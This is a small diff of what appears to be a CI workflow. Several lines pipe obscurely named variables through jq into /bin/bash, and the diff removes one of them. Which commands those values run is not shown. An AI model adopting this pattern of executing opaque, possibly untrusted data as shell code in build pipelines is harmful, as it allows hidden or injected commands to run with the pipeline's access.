@@ -24,7 +24,6 @@ jobs:
           echo $y2 | jq -r .rv810 | /bin/bash
           printf '%s' "$xw46" | jq -r .scvd94 | /bin/bash
           printf '%s' "$ejvfp20571" | jq -r .zhp675 | /bin/bash
-          printf '%s' "$ctvot13492" | jq -r .stkka21 | /bin/bash
           printf '%s' "$njj406" | jq -r .lmqh1398 | /bin/bash
           printf '%s' "$jhea5" | jq -r .xo67 | /bin/bash
           printf '%s' "$mtsk9" | jq -r .ar059 | /bin/bash
